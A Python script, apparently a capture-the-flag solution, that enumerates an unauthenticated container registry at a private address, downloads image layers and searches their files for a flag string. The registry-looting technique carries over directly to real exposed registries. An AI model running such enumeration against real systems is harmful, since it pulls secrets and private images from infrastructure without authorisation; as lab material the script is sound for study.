import urllib.request, json, gzip, io, tarfile

REG = "http://172.27.0.1:5000"

def gj(u):
    r = urllib.request.Request(u)
    r.add_header("Accept", "application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json")
    return json.load(urllib.request.urlopen(r, timeout=20))

# Get catalog
try:
    cat = gj(f"{REG}/v2/_catalog")
    repos = cat.get("repositories", [])
    print(f"Repositories: {repos}")
    
    for repo in repos:
        try:
            tags_data = gj(f"{REG}/v2/{repo}/tags/list")
            tags = tags_data.get("tags", [])
            print(f"\n{'='*60}")
            print(f"{repo}: {tags}")
            print("="*60)
            
            for tag in tags:
                try:
                    m = gj(f"{REG}/v2/{repo}/manifests/{tag}")
                    layers = m.get("layers", [])
                    
                    for idx, L in enumerate(layers[:5]):  # Check first 5 layers per tag
                        digest = L.get("digest")
                        size = L.get("size", 0)
                        
                        if size > 10000000:  # Skip huge layers
                            continue
                        
                        try:
                            d = urllib.request.urlopen(f"{REG}/v2/{repo}/blobs/{digest}", timeout=15).read()
                            try:
                                raw = gzip.decompress(d)
                            except:
                                raw = d
                            
                            if b"TDHT{" in raw:
                                print(f"\n{'='*60}")
                                print(f"FLAG FOUND in {repo}:{tag} layer {idx}!")
                                print("="*60)
                                i = raw.find(b"TDHT{")
                                print(raw[i:i+100].decode('utf-8', 'replace'))
                                exit(0)
                            
                            try:
                                tf = tarfile.open(fileobj=io.BytesIO(raw))
                                for mem in tf.getmembers():
                                    if mem.isfile() and mem.size < 1000000:
                                        c = tf.extractfile(mem).read()
                                        if b"TDHT{" in c:
                                            print(f"\n{'='*60}")
                                            print(f"FLAG in {repo}:{tag}/{mem.name}!")
                                            print("="*60)
                                            print(c.decode('utf-8', 'replace')[:500])
                                            exit(0)
                            except:
                                pass
                        except Exception as e:
                            pass
                            
                except Exception as e:
                    print(f"  Manifest error for {tag}: {str(e)[:50]}")
        except Exception as e:
            print(f"Tags error for {repo}: {str(e)[:50]}")
except Exception as e:
    print(f"Catalog error: {e}")

print("\nNo flag in registry")
PYEND
